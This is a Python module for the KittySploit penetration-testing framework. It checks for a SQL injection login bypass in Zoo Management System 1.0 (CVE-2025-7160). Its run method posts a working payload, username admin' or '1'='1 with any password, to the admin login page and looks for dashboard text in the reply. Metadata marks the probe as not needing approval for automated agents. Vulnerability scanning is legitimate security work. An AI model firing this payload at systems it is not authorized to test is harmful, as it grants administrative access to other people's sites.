#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zoo Management System 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zoo Management System 1.0 - SQL Injection Detection',
        'description': 'Zoo Management System 1.0 contains a SQL injection vulnerability via the username parameter on the login page. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'edb', 'packetstorm', 'zms', 'sqli', 'auth-bypass', 'cms', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/48880',
            'https://packetstormsecurity.com/files/167572/Zoo-Management-System-1.0-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-7160',
        ],
        'cve': 'CVE-2025-7160',
    }

    def run(self):
        path = '/admin/index.php'
        r = self.http_request(method='POST', path=path, allow_redirects=True, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='username=admin%27+or+%271%27%3D%271&password=any&login=\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('ZMS ADMIN', 'Dashboard', 'Zoo Management System',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Zoo Management System 1.0 - SQL Injection detected', path=path)
            return True
        return False

